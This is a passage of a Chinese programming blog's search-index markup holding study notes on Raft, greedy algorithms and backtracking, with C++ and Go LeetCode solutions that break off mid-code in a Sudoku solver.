&lt;p&gt;最终，候选者S2获得了S1和S2自己的&lt;a href=&#34;https://www.zhihu.com/search?q=%E8%B5%9E%E6%88%90%E7%A5%A8&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;赞成票&lt;/a&gt;，那么在它眼里，它就变成了Leader，而S3获得了S4、S5和S3自己的赞成票，在它眼里S3也变成了Leader，那么多Leader的问题就产生了。而产生该问题的最根本原因是S2和S3的系统视图不一致。&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;RE&lt;/h2&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/27207160&lt;br&gt;
https://raft.github.io/raft.pdf&lt;/p&gt;
">【分布式】Raft 一致性共识算法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-tan-xin/"" data-c="
          &lt;p&gt;贪心算法没有固定的套路，难点就是图和通过局部最优，推出整体最优。&lt;/p&gt;
&lt;p&gt;最好的策略就是举反例，想不到范例，那就可以试一试贪心。&lt;/p&gt;
&lt;p&gt;想清楚局部最优和全局最优，感觉局部最优可以推出全局最优，并想不出返例，就可以试试贪心。&lt;/p&gt;
&lt;h4 id=&#34;分发饼干&#34;&gt;分发饼干&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/assign-cookies/submissions/&lt;/p&gt;
&lt;p&gt;这里的局部最优解就是大饼干喂给胃口大的，充分利用饼干尺寸，全局最优就是喂饱尽可能多的小孩。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findContentChildren(vector&amp;lt;int&amp;gt;&amp;amp; g, vector&amp;lt;int&amp;gt;&amp;amp; s) {
        sort(g.begin(), g.end());
        sort(s.begin(), s.end());
        int res = 0;
        for (int i = 0; i &amp;lt; s.size(); i ++) {
            if (res &amp;lt; g.size() &amp;amp;&amp;amp; g[res] &amp;lt;= s[i])
                res ++ ;
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;摆动序列&#34;&gt;摆动序列&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/wiggle-subsequence/&lt;/p&gt;
&lt;p&gt;局部最优：将一个单调序列中除了两个峰值的其它元素删除掉&lt;/p&gt;
&lt;p&gt;全局最优：将序列中的所有单调部分除了局部峰值都删除掉&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int wiggleMaxLength(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (nums.size() &amp;lt;= 1) return nums.size();
        int curDiff = 0; // 当前一对差值
        int preDiff = 0; // 前一对差值
        int result = 1;  // 记录峰值个数，序列默认序列最右边有一个峰值
        for (int i = 0; i &amp;lt; nums.size() - 1; i++) {
            curDiff = nums[i + 1] - nums[i];
            // 出现峰值
            if ((curDiff &amp;gt; 0 &amp;amp;&amp;amp; preDiff &amp;lt;= 0) || (preDiff &amp;gt;= 0 &amp;amp;&amp;amp; curDiff &amp;lt; 0)) {
                result++;
                preDiff = curDiff;
            }
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;最大子序和&#34;&gt;最大子序和&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-subarray/&lt;/p&gt;
&lt;p&gt;局部最优：当前连续和为负数时立刻放弃，从下一个元素重新计算连续和&lt;/p&gt;
&lt;p&gt;全局最优：选取最大连续和&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// 贪心
class Solution {
public:
    int maxSubArray(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int res = -100000；
        int count = 0;
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            count += nums[i];
            res = max(count, res);
            if (count &amp;lt; 0) count = 0; // 如果前面的子序列和小于0，那么就不要选了
        }
        return res;
    }
};

// 动规
class Solution {
public:
    int maxSubArray(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int dp[100005];
        dp[0] = nums[0];
        int res = dp[0];
        for (int i = 1; i &amp;lt; nums.size(); i++) {
            dp[i] = max(dp[i - 1] + nums[i], nums[i]); // 状态转移
            res = max(dp[i], res);
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
">【算法】贪心</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-hui-su/"" data-c="
          &lt;p&gt;回溯其实就是DFS的一种，通常DFS需要有一个全局的纪录，记录哪些节点被访问过了。&lt;/p&gt;
&lt;p&gt;回溯是递归的副产品，只要有递归就会又回溯，另外回溯法不是什么高效的算法，因为回溯本质上是穷举，如果想要高效一些，需要加上剪枝。&lt;/p&gt;
&lt;p&gt;回溯一般能解决的问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;组合问题：N个数中按一定规则找出k个数的集合；&lt;/li&gt;
&lt;li&gt;切割问题：一个字符串按一定规则有几种切割方式；&lt;/li&gt;
&lt;li&gt;子集问题：N个数的集合里有多少符合条件的子集；&lt;/li&gt;
&lt;li&gt;排列问题：N个数按一定规则全排列，有几种排列方式；&lt;/li&gt;
&lt;li&gt;棋盘问题：N皇后，解数独等&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;回溯问题都可以抽象为&lt;strong&gt;树形结构&lt;/strong&gt;，在集合中递归查找某些元素，集合的大小就构成了树的宽度，递归的深度就是树的深度。for循环是树的横向遍历，递归是树的深度遍历。&lt;/p&gt;
&lt;p&gt;模板：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void backtracking(参数) {
    if (终止条件) {
        存放结果;
        return;
    }

    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) {
        处理节点;
        backtracking(路径，选择列表); // 递归
        回溯，撤销处理结果;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;组合&#34;&gt;组合&lt;/h4&gt;
&lt;p&gt;给定两个整数 &lt;code&gt;n&lt;/code&gt; 和 &lt;code&gt;k&lt;/code&gt;，返回范围 &lt;code&gt;[1, n]&lt;/code&gt; 中所有可能的 &lt;code&gt;k&lt;/code&gt; 个数的组合。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combine(int n, int k) {
        backtracing(1, n, k);
        return res;
    }

    void backtracking(int index, int n, int k) {
        if (tmpres.size() == k) {
            res.push_back(tmpres);
            return ;
        }
        // for (int i = index; i &amp;lt;= n - (k - tmpres.size()) + 1; i ++) { // 剪枝
        for (int i = index; i &amp;lt;= n; i ++) {
            tmpres.push_back(i);
            backtracing(i + 1, n, k);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里可以做一个剪枝优化，就是如果剩下的待选择的数的个数小于需要的个数的话，那么就没有必要遍历了，例如n=4，k=4，那么index从2开始的后面的数就没必要遍历了，因为肯定不够四个数了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;已经选择元素的个数：&lt;code&gt;tmpres.size()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;还需要选择的个数：&lt;code&gt;k - tmpres.size()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在集合中至多要起始的位置：&lt;code&gt;n - (k - tmpres.size()) + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;例如，n=4， k=3， 那么当一个元素没有选&lt;code&gt;tmpres.size() == 0&lt;/code&gt;时，至少要从2开始遍历，如果从3开始遍历显然后面的数字就不够k个了。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;组合总和1&#34;&gt;组合总和1&lt;/h4&gt;
&lt;p&gt;找出所有相加之和为 n 的 k 个数的组合。组合中只允许含有 1 - 9 的正整数，并且每种组合中不存在重复的数字。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmp;
    int visit[10] = {0};
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum3(int k, int n) {
        backtracking(1, k, n, 0);
        return res;
    }

    void backtracking(int index, int k, int n, int sum) {
        // if(sum &amp;gt; n) return ; // 剪枝
        if (tmp.size() == k &amp;amp;&amp;amp; sum == n) {
            res.push_back(tmp);
            return ;
        }
        // for (int i = index; i &amp;lt;= 9 - (k - tmp.size()) + 1; i ++) { // 剪枝
        for (int i = index; i &amp;lt;= 9; i ++) {
            if (visit[i] != 1) {
                tmp.push_back(i);
                visit[i] = 1;
                backtracking(i + 1, k, n, sum + i);
                visit[i] = 0;
                tmp.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;剪枝就是如果当前tmp中所有数的和已经大于n了，那么后面的遍历也就没意义了，肯定更大了，所以&lt;code&gt;if(sum &amp;gt; n) return ;&lt;/code&gt;，另外如果剩下的数的个数不够了，显然也不用继续遍历了，即：&lt;code&gt;i &amp;lt;= 9 - (k - tmp.size() + 1)&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;电话号码的字母组合&#34;&gt;电话号码的字母组合&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/submissions/&lt;/p&gt;
&lt;p&gt;手机9宫格按键，例如输入&amp;quot;23&amp;quot;，可能出现的字符组合为[&amp;quot;ad&amp;quot;, &amp;quot;ae&amp;quot;, &amp;quot;af&amp;quot;, &amp;quot;bd&amp;quot;, &amp;quot;be&amp;quot;, &amp;quot;bf&amp;quot;, &amp;quot;cd&amp;quot;, &amp;quot;ce&amp;quot;, &amp;quot;cf&amp;quot;]。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;char&amp;gt; tmp;
    string number_str[11] = {&amp;quot;&amp;quot;, &amp;quot;&amp;quot;, &amp;quot;abc&amp;quot;, &amp;quot;def&amp;quot;, &amp;quot;ghi&amp;quot;, &amp;quot;jkl&amp;quot;, &amp;quot;mno&amp;quot;, &amp;quot;pqrs&amp;quot;, &amp;quot;tuv&amp;quot;, &amp;quot;wxyz&amp;quot;};
    vector&amp;lt;string&amp;gt; letterCombinations(string digits) {
        if(digits == &amp;quot;&amp;quot;) return res;
        int k = digits.length();
        backtracking(digits, 0, k);
        return res;
    }

    void backtracking(string digits, int digits_index, int k) {
        if (digits_index == k) {
            string str = &amp;quot;&amp;quot;;
            for (int i = 0; i &amp;lt; k; i ++) {
                str += tmp[i];
            }
            res.push_back(str);
            return ;
        }
        string str = number_str[digits[digits_index] - &#39;0&#39;];
        for (int i = 0; i &amp;lt; str.length(); i ++) {
            tmp.push_back(str[i]);
            backtracking(digits, digits_index + 1, k);
            tmp.pop_back();
        }

        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;思路大概就是按照输入的数字，对于每个数字挑出一个字符，树的深度就是键入的数字的个数，宽度就是最长是4。终止条件就是选取的字符的个数等于键入的数字的个数时。&lt;/p&gt;
&lt;h4 id=&#34;组合总和2&#34;&gt;组合总和2&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum/&lt;/p&gt;
&lt;p&gt;给定一个无重复元素的正整数数组 candidates 和一个正整数 target ，找出 candidates 中所有可以使数字和为目标数 target 的唯一组合，candidate中的元素可以多次使用，但结果中不能存在相同的子集。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt;res;
    vector&amp;lt;int&amp;gt; tmp;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target) {
        if(candidates.size() == 0 || target == 0) return res; 
        backtracking(candidates, target, 0, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target, int sum, int index) {
        if(sum &amp;gt; target) return ;
        if (sum == target) {
            res.push_back(tmp);
            return ;
        }
        for (int i = index; i &amp;lt; candidates.size(); i ++) {
            tmp.push_back(candidates[i]);
            backtracking(candidates, target, sum + candidates[i], i);
            tmp.pop_back();
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里需要注意的是index 不是从i+1开始了，而是从i开始，因为可以有重复元素。&lt;/p&gt;
&lt;h4 id=&#34;组数总和3&#34;&gt;组数总和3&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum-ii/&lt;/p&gt;
&lt;p&gt;这道题在之前的基础上，candidate数组中的元素有重复的了，但是每个元素只能使用一次。&lt;/p&gt;
&lt;p&gt;有重复的就需要去重，在树形结构中重复分为两个维度，第一个维度就是一个树枝上的重复元素，另一个维度就是从一层上的重复元素，这道题显然是需要去除同一层上的重复元素。&lt;/p&gt;
&lt;p&gt;同一层上的元素，就是同一个for循环中，也就是如果该for循环用过了某个元素，那么应该标记一下它，下次再到它时就跳过。但是需要先排序。原因是：例如1，7，1，target=8，如果不排序，就算在一个for循环中标注了1使用过，还是会有重复的[1,7]和[7,1]，原因是虽然1标注使用过，但是如果7开头时，递归下去之后，下一层的for循环对1还是没有标注使用过。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum2(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target) {
        sort(candidates.begin(), candidates.end());
        backtracking(candidates, target, 0, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target, int sum, int index) {
        if(sum &amp;gt; target) return ;
        if (sum == target) {
            res.push_back(tmpres);
            return ;
        }
        int used[101] = {0};
        for (int i = index; i &amp;lt; candidates.size(); i ++) {
            if (used[candidates[i]]) continue;
            used[candidates[i]] = 1;
            tmpres.push_back(candidates[i]);
            backtracking(candidates, target, sum + candidates[i], i + 1);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;分割回文串&#34;&gt;分割回文串※&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/palindrome-partitioning/&lt;/p&gt;
&lt;p&gt;切割字符串其实和组合问题相似，对于字符串abcdef：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;组合问题：选取一个a之后，在bcdef中再选取第二个，选取b之后在cdef中选第三个...&lt;/li&gt;
&lt;li&gt;切割问题：切割一个a之后，在bcdef中再切割第二段，然后切割第三段...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;唯一不同点在于，在切割前需要判断一下待切割的字符串是不是回文。&lt;/p&gt;
&lt;p&gt;对于每一层递归，startIndex代表起始字符，然后看s[startIndex, i]是不是回文，如果是，那么就将其截取，进入下一层递归，起始字符是i+1，如果s[startIndex, i]不是回文，那就接着判断s[startIndex, i+1]是不是回文...&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; ans;
    vector&amp;lt;string&amp;gt; tmpans;
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; partition(string s) {
        backtrancing(s, 0);
        return ans;
    }

    void backtracking(string s, int startIndex) {
        if (startIndex == s.length()) {
            ans.push_back(tmpans);
            return ;
        }
        for (int i = startIndex; i &amp;lt; s.length(); i ++) {
            if (isH(s, startIndex, i)) {
                tmpans.push_back(s.substr(startIndex, i - startIndex + 1));
                backtrancing(s, i + 1);
            }
            else continue;
            tmpans.pop_back();
        }
    }


    bool isH(string str, int start, int end) {
        int len = str.length();
        for (int i = start, j = end; i &amp;lt;= j; i ++, j --) {
            if(str[i] != str[j]) return false;
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;复原ip地址&#34;&gt;复原IP地址&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/restore-ip-addresses/&lt;/p&gt;
&lt;p&gt;这道题其实也是字符串分割问题，只不过相比回文分割来说，限制的条件发生了变化，这次是看分割的字串是不是合法的ip地址范围，只需要在每次分割之前判断是否符合条件即可。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;string&amp;gt; ip;
    vector&amp;lt;string&amp;gt; restoreIpAddresses(string s) {
        if(s.length() &amp;gt; 16) return res;
        backtracking(s, 0);
        return res;
    }

    void backtracking(string s, int startIndex) {
        if(ip.size() &amp;gt; 4) return;
        if (startIndex == s.length() &amp;amp;&amp;amp; ip.size() == 4) {
            string tmp = ip[0];
            for (int i = 1; i &amp;lt; 4; i ++) {
                tmp += &amp;quot;.&amp;quot; + ip[i];
            }
            res.push_back(tmp);
            return ;
        }
        for (int i = startIndex; i &amp;lt; s.length(); i++) {
            string substr = s.substr(startIndex, i - startIndex + 1);
            if(substr.length() &amp;gt; 1 &amp;amp;&amp;amp; substr[0] == &#39;0&#39; || substr.length() &amp;gt; 3) break;
            int subnum = toInt(substr);
            if (subnum &amp;gt;= 0 &amp;amp;&amp;amp; subnum &amp;lt;= 255) {
                ip.push_back(substr);
                backtracking(s, i + 1);
            }
            else break;
            ip.pop_back();
        }
    }

    int toInt(string str) {
        int res = 0;
        for (int i = 0; i &amp;lt; str.length(); i ++) {
            res = res * 10 + str[i] - &#39;0&#39;;
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;子集&#34;&gt;子集&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/subsets/&lt;/p&gt;
&lt;p&gt;怎么说，就很简单&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; subsets(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        res.push_back(tmpres);
        for (int i = startIndex ; i &amp;lt; nums.size(); i ++) {
            tmpres.push_back(nums[i]);
            backtracking(nums, i + 1);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;子集ii&#34;&gt;子集Ⅱ※&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/subsets-ii/&lt;/p&gt;
&lt;p&gt;这个区别是nums数组中有重复元素了，那么这样就又可能选到重复的子集，那么这种重复是之前遇到的，在回溯的树形结构中，同一层如果出现同一元素，那么结果必然会有重复的，因此需要去掉同层之间的重复元素，所以去重的方法就是在每一层递归中记录一下遍历过的元素，如果下一个元素已经遍历过了那么就直接跳过。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; subsetsWithDup(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        sort(nums.begin(), nums.end());
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        res.push_back(tmpres);
        map&amp;lt;int, bool&amp;gt; flag;
        for (int i = startIndex ; i &amp;lt; nums.size(); i ++) {
            if (flag[nums[i]] == 0) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums, i + 1);
                tmpres.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;递增子序列&#34;&gt;递增子序列&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/increasing-subsequences/&lt;/p&gt;
&lt;p&gt;就很简单&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; findSubsequences(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        if (tmpres.size() &amp;gt; 1) {
            res.push_back(tmpres);
        }
        map&amp;lt;int, bool&amp;gt; flag;
        for (int i = startIndex; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                if (tmpres.size() == 0 || nums[i] &amp;gt;= tmpres[tmpres.size() - 1]) {
                    tmpres.push_back(nums[i]);
                    flag[nums[i]] = 1;
                    backtracking(nums, i + 1);
                }
                else continue;
                tmpres.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;全排列&#34;&gt;全排列&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/permutations/&lt;/p&gt;
&lt;p&gt;像这种去重就是一个树枝上的重复元素，需要一个全局的标记，如果某个元素已经选上了，那么就不能再用了，即一个元素只能被选一次。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    map&amp;lt;int, bool&amp;gt; flag;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; permute(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (tmpres.size() == nums.size()) {
            res.push_back(tmpres);
            return ;
        }
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums);
                tmpres.pop_back();
                flag[nums[i]] = 0;
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;全排列ii&#34;&gt;全排列Ⅱ※&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/permutations-ii/submissions/&lt;/p&gt;
&lt;p&gt;这道题中，数组出现了重复元素，也就是说同层之间需要去除重复值元素，一个子树中要去除同一个下标元素(一个下标只能被选一次)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    map&amp;lt;int, bool&amp;gt; flag;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; permute(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (tmpres.size() == nums.size()) {
            res.push_back(tmpres);
            return ;
        }
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums);
                tmpres.pop_back();
                flag[nums[i]] = 0;
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;重新安排行程&#34;&gt;重新安排行程※&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reconstruct-itinerary/&lt;/p&gt;
&lt;p&gt;一顿操作猛如虎，一看击败百分五&lt;/p&gt;
&lt;p&gt;这道题有些难度，主要是怎么将tickets转换成比较容易计算判断的数据结构，可以直接用unordered_map&amp;lt;string, map&amp;lt;string, int&amp;gt;表示从源到目的机票数量，利用map的自动排序可以完成题目要求的字典顺序。&lt;/p&gt;
&lt;p&gt;基本思路就是每到达一个地方就查看可以前往下一个地方的所有车票，因为用map存储，所以是按照字典序排列好的，用过的车票不能再用，所以需要将车票数量减1。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; tmpans;
    unordered_map&amp;lt;string, map&amp;lt;string, int&amp;gt;&amp;gt; mytickets;
    vector&amp;lt;string&amp;gt; findItinerary(vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt;&amp;amp; tickets) {
        
        for (int i = 0; i &amp;lt; tickets.size(); i++ ) {
            mytickets[tickets[i][0]][tickets[i][1]] ++ ;
        }
        tmpans.push_back(&amp;quot;JFK&amp;quot;);
        backtracking(tickets, &amp;quot;JFK&amp;quot;);

        return tmpans;
    }

    void backtracking(vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; tickets, string current) {
        if (tmpans.size() == tickets.size() + 1) return ;

        for (auto it = mytickets[current].begin(); it != mytickets[current].end() ; it ++) {
            if (it-&amp;gt;second &amp;gt; 0) {
                it-&amp;gt;second --;
                tmpans.push_back(it-&amp;gt;first);
                backtracking(tickets, it-&amp;gt;first);
                if (tmpans.size() == tickets.size() + 1) return ;
                tmpans.pop_back();
                it-&amp;gt;second ++;
            }
            
        }

    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;n皇后&#34;&gt;n皇后※&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/n-queens/&lt;/p&gt;
&lt;p&gt;一顿操作...&lt;/p&gt;
&lt;p&gt;如果一个点有皇后，那么它的该行、该列、对角行和饭对角行都不能有皇后，难点就在于怎么去表示i行j列这个点所影响的行列和对角。&lt;/p&gt;
&lt;p&gt;这里需要用四个数组分别表示i行j列所在的行、列、对角行、反对角行：&lt;/p&gt;
&lt;p&gt;以第i行、第j列为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;row[i]&lt;/li&gt;
&lt;li&gt;col[j]&lt;/li&gt;
&lt;li&gt;xie[n-(i-j)-1]&lt;/li&gt;
&lt;li&gt;backxie[i+j]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;简单推以下就能得出。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; res;
    vector&amp;lt;string&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; solveNQueens(int n) {
        vector&amp;lt;int&amp;gt; row(n, 0);
        vector&amp;lt;int&amp;gt; col(n, 0);
        vector&amp;lt;int&amp;gt; xie(2 * n - 1, 0);
        vector&amp;lt;int&amp;gt; backxie(2 * n - 1, 0);
        string tmp = &amp;quot;&amp;quot;;
        for (int i = 0; i &amp;lt; n; i ++) {
            tmp += &#39;.&#39;;
        }
        for (int i = 0; i &amp;lt; n; i ++) {
            tmpres.push_back(tmp);
        }
        backtracking(n, row, col, xie, backxie, 0, 0);
        
        return res;

    }

    void backtracking(int n, vector&amp;lt;int&amp;gt;&amp;amp; row, vector&amp;lt;int&amp;gt;&amp;amp; col, vector&amp;lt;int&amp;gt;&amp;amp; xie, vector&amp;lt;int&amp;gt; backxie, int k, int cnt) {
        if (cnt == n) {
            res.push_back(tmpres);
            return ;
        }

        for (int i = k; i &amp;lt; n; i++) {
            for (int j = 0; j &amp;lt; n; j++) {
                if(row[i] != 1 &amp;amp;&amp;amp; col[j] != 1 &amp;amp;&amp;amp; xie[n - (i - j) - 1] != 1 &amp;amp;&amp;amp; backxie[i + j] != 1) {
                    row[i] = 1;
                    col[j] = 1;
                    xie[n - (i - j) - 1] = 1;
                    backxie[i + j] = 1;
                    tmpres[i][j] = &#39;Q&#39;;
                    backtracking(n, row, col, xie, backxie, i + 1, cnt + 1);
                    tmpres[i][j] = &#39;.&#39;;
                    row[i] = 0;
                    col[j] = 0;
                    xie[n - (i - j) - 1] = 0;
                    backxie[i + j] = 0;
                }
            }
           
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;解数独&#34;&gt;解数独&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/sudoku-solver/&lt;/p&gt;
&lt;p&gt;这个相比于N皇后问题，不同点在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只有一个解，所以回溯函数一旦找到解之后就应该立即返回，因此递归的出口需要写清楚&lt;/li&gt;
&lt;li&gt;从一个皇后升级到了9个不同的皇后&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func solveSudoku(board [][]byte)  {
    var numrow [9][10] int
    var numcol [9][10] int
    var num9 [9][10] int
    var backtracking func(board [][]byte) int 

    for i := 0; i &amp;lt; 9; i++ {
        for j := 0; j &amp;lt; 9; j++ {
            if board[i][j] != &#39;.&#39; {
                numrow[i][board[i][j] - &#39;0&#39;] = 1
                numcol[j][board[i][j] - &#39;0&#39;] = 1
                num9[i / 3 * 3 + j / 3][board[i][j] - &#39;0&#39;] = 1
                continue
            }
        }
    }
    
